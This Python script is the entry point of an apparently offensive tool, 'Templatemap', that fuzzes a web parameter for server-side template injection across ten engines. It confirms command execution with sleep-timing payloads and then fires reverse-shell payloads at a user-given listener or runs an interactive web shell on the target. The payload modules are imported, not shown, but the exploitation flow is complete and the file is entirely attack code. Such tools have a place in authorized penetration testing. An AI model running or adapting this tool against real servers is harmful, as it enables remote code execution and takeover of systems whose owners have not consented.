#!/usr/bin/env python3
import colorama
from termcolor import colored
import mparser
import inject
import argparse
import basic
from freemarker import *
from jinja import *
from mako import *
from ruby import *
from tornado import *
from java import *
from velocity import *
from jade import *
from twig import *
from handlebars import *
import exploiter



parser = argparse.ArgumentParser(description='Templatemap')
parser.add_argument('-url',required=True, type=str, dest="url",help='The url : http://example.com/endpoint?param=tofuzz&id=1')
parser.add_argument('--method', choices=['get','post'],default="get",dest="method",help='The method to use : get/post (def is get)')
parser.add_argument('-parameter', required=True,dest="parameter",help='The parameter to fuzz')
parser.add_argument('--cookie', default={},dest="cookie",help='Cookies, separated by semicolon : cookie1=value1;cookie2=value2')
parser.add_argument('--base64', action='store_true',default=False,help='Add this if the payload should be encoded to base64')
parser.add_argument('--template', default=False,choices=["handlebars","ruby","tornado","jinja","freemarker","mako","java","velocity","jade","twig"],dest="plugins",help='Put the name of the template if you already know it')
parser.add_argument('--data', default={},dest="data",help='Default post data, separated by semicolon : var=data;var=data')
parser.add_argument('--rev-shell', action='store_true',default=False,dest="osshell",help='Open a reverse shell')
parser.add_argument('--web-shell', action='store_true',default=False,dest="webshell",help='Open a web shell')
parser.add_argument('--prefixe', action='store_true',default=False,dest="pref",help='Add this option if you want to add prefixe')
parser.add_argument('--suffixe', action='store_true',default=False,dest="suff",help='Add this option if you want to add suffixe')
args = parser.parse_args()

plugins = {
"freemarker" : freemarker(),
"jinja" : jinja(),
"mako" : mako(),
"ruby" : ruby(),
"tornado" : tornado(),
"java" : java(),
"velocity" : velocity(),
"jade" : jade(),
"twig" : twig(),
"handlebars" : handlebars()
}
backup = plugins.copy()
if args.plugins:
    plugins = {args.plugins : plugins[args.plugins]}

exploiter = exploiter.exploit()
colorama.init()
pars = mparser.parser()
scanner = basic.basic()
suspect = []
RCE = False
method = args.method
parameter = args.parameter
recon_array = []
pars.test_url(args.url,method)
url = pars.check_param(args.url,parameter,method)
cookie = args.cookie

if len(cookie) > 0:
    cookie = pars.parse_arg(cookie)
data = args.data

if len(data) > 0:
    data= pars.parse_arg(data)
inj = inject.inject(url,method,parameter,data,cookie,args.base64,args.pref,args.suff)
debug = colored("[*] ","blue")
error = colored("[-] ","red")
flag = colored("[+] ","green")

if __name__ == "__main__":

    if len(plugins) > 1:
        print(debug+"Testing if the X-Powered-By header is present")
        header = scanner.headers(inj.inject('test')[0])
        if header:
            print("\n"+flag+f"X-Powered-By header is present and suggest that the target is running with {header}")
            resp_h = input(debug+"Do you want to skip payloads for other templates ? [y/n] :" or "n")
            if resp_h == "y":  plugins ={ header: backup[header] }

    if len(plugins) > 1:
        print(debug+"Testing basic error payload")
        error_resp = inj.inject(scanner.error)
        error_scan = scanner.errorf(error_resp)
        if error_scan:
            print(flag+f"Basic error payload shows that target is running {error_scan}")
            resp_e = input(debug+"Do you want to skip payloads for other templates ? [y/n] :" or "n")
            if resp_e == "y":  plugins ={ error_scan: backup[error_scan] }


    print(debug+"Testing basic payloads")
    valid = []
    for i in scanner.pay:
        resp_i = inj.inject(i)
        test = scanner.recon(resp_i,i)
        if test:
            print(flag+"Working payload : "+"".join(test))
            p = test[1]
            s = test[2]
            inj.suffixe = inj.prefixe = ['']
            for t in plugins:
                if test[0] == plugins[t].payload_test()[0]: valid.append(t)
            break
    if len(valid) == 0 :
        print(debug+"No valid output found")
        print(error+"No tested payload seems to work, try with --prefixe or --suffixe or delete --template flag")
        exit()
    else:
        plugins ={ valid[0]: backup[valid[0]] }
        print(flag+f"Valid output for {valid[0]} payload")


    w_plug = plugins[valid[0]]
    if w_plug.exec:
        print(debug+"Testing command execution")
        test_exec = w_plug.execu("sleep 2")
        for i in test_exec:
            f= p+i+s
            resp_x = inj.inject(f)
            obj = resp_x[0][0]
            test_t = scanner.system(obj,2)
            if test_t:
                print(flag+f"Command execution working with payload {f}")
                index = test_exec.index(i)
                print(debug+"Testing if it is a false positive")
                f_p = scanner.system(inj.inject(p+w_plug.execu("sleep 4",index)+s)[0][0],4)
                if f_p:
                    print(flag+"Not a false positive")
                    print(flag+"Command execution allowed")
                    RCE = True
                    break
    elif w_plug.download:
        print(debug+valid[0]+" maybe allows file retreiving")
    # TODO : file retreiving mais jai la flemme
    if RCE:
        if args.osshell:
            print(colored("[!] You need to open a listener in an other window","magenta"))
            LHOST = input("LHOST (your listening ip) :")
            LPORT = input("LPORT (your listening port) :")

            shell_payloads = exploiter.rev(LHOST,LPORT)

            print(colored("[+++] Praying for your shell !!!"))
            for a in shell_payloads:
                payl = p+w_plug.execu(a,index)+s
                inj.inject(payl)
        elif args.webshell:
            while True:
                cmd = input("Command :")
                pr = p + w_plug.execu("echo beaconed",index)
                su = w_plug.execu("echo beaconed",index) + s
                payl =  w_plug.execu(cmd,index)
                res = inj.inject(pr + payl + su)[0][0]
                t = exploiter.webshell(res)
                print(t)


